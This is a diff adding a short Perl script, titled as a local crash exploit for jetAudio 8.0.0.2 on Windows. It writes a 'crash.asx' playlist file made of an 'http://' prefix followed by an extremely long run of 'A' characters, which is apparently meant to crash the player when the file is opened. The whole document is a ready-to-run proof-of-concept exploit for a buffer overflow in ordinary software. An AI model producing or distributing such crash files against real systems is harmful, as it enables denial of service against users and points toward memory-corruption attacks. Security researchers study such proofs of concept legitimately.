@@ -1,0 +1,17 @@
+#!/usr/bin/perl
+# Title: jetAudio 8.0.0.2 Basic Local Crash Exploit
+# Author: cr4wl3r
+# Platform: Windows
+#########################################
+
+my $file= "crash.asx";
+
+my $boom= "http://"."AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" x 5000;
+
+open($FILE,">>$file");
+
+print $FILE "$boom";
+
+close($FILE);
+
+print "Done..!~#\n";
